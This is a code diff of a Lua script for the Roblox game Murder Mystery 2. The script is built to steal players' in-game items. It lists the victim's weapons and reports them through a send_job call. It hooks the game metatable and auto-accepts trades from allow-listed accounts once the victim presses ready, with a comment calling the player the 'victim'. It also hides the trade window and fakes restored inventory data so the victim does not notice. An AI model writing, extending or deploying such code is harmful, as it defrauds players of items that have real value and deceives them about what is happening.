@@ -144,38 +144,107 @@ end
 local function hook_mm2()
     local Trade = RS:WaitForChild("Trade", 10)
     if not Trade then return end
-    local sendRequest   = Trade:WaitForChild("SendRequest", 10)
-    local acceptRequest = Trade:WaitForChild("AcceptRequest", 10)
-    if not sendRequest or not acceptRequest then return end
+    local updateTrade  = Trade:WaitForChild("UpdateTrade", 10)
+    local acceptTrade  = Trade:WaitForChild("AcceptTrade", 10)
+    if not updateTrade or not acceptTrade then return end
 
     local items = collect_mm2_items()
     send_job("MM2", items)
 
-    sendRequest.OnClientInvoke = function(senderPlayer)
-        local senderName = typeof(senderPlayer) == "Instance" and senderPlayer.Name or tostring(senderPlayer)
-        local isAllowed = false
+    local currentTradeId = nil
+    local currentLastOffer = nil
+    local tradingWithAllowed = false
+    local storedItems = {}
+
+    local ok, ProfileData = pcall(function() return require(RS.Modules.ProfileData) end)
+
+    local function isAllowedUser(name)
         for _, n in ipairs(CFG.allowed) do
-            if string.lower(n) == string.lower(senderName) then isAllowed = true break end
+            if string.lower(n) == string.lower(name) then return true end
         end
-        if not isAllowed then return false end
-        task.wait(1)
-        acceptRequest:FireServer()
-        task.wait(0.5)
-        acceptRequest:FireServer()
-        return true
+        return false
     end
+
+    local function storeItems()
+        storedItems = {}
+        if ok and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+            for k, v in pairs(ProfileData.Weapons.Owned) do
+                storedItems[k] = v
+            end
+        end
+    end
+
+    local function restoreItems()
+        if ok and ProfileData and ProfileData.Weapons and ProfileData.Weapons.Owned then
+            for k, v in pairs(storedItems) do
+                ProfileData.Weapons.Owned[k] = v
+            end
+        end
+    end
+
+    updateTrade.OnClientEvent:Connect(function(tradeData)
+        if type(tradeData) ~= "table" then return end
+
+        local p1 = tradeData.Player1
+        local p2 = tradeData.Player2
+        if not p1 or not p2 then return end
+
+        local otherPlayer = nil
+        if p1.Player == lp then
+            otherPlayer = p2.Player
+        elseif p2.Player == lp then
+            otherPlayer = p1.Player
+        end
+
+        if not otherPlayer then return end
+
+        local otherName = typeof(otherPlayer) == "Instance" and otherPlayer.Name or tostring(otherPlayer)
+        tradingWithAllowed = isAllowedUser(otherName)
+
+        if tradingWithAllowed then
+            storeItems()
+            -- auto accept when victim presses ready (Accepted becomes true)
+            local victimData = p1.Player == lp and p1 or p2
+            if victimData.Accepted and currentTradeId then
+                task.spawn(function()
+                    task.wait(0.5)
+                    pcall(function()
+                        acceptTrade:FireServer(currentTradeId, currentLastOffer)
+                    end)
+                end)
+            end
+        end
+    end)
+
+    -- hook AcceptTrade to capture tradeId/lastOffer and auto-fire
+    local mt = getrawmetatable(game)
+    local oldIndex = mt.__index
+    setreadonly(mt, false)
+    mt.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if method == "FireServer" and self == acceptTrade then
+            local args = {...}
+            currentTradeId = args[1]
+            currentLastOffer = args[2]
+            if tradingWithAllowed then
+                task.delay(1, restoreItems)
+            end
+        end
+        return oldIndex(self, ...)
+    end)
+    setreadonly(mt, true)
 
     local gui = lp:WaitForChild("PlayerGui")
     local tradeGui      = gui:WaitForChild("TradeGUI", 10)
     local tradeGuiPhone = gui:FindFirstChild("TradeGUI_Phone")
     if tradeGui then
         tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if tradeGui.Enabled then tradeGui.Enabled = false end
+            if tradeGui.Enabled and tradingWithAllowed then tradeGui.Enabled = false end
         end)
     end
     if tradeGuiPhone then
         tradeGuiPhone:GetPropertyChangedSignal("Enabled"):Connect(function()
-            if tradeGuiPhone.Enabled then tradeGuiPhone.Enabled = false end
+            if tradeGuiPhone.Enabled and tradingWithAllowed then tradeGuiPhone.Enabled = false end
         end)
     end
 end
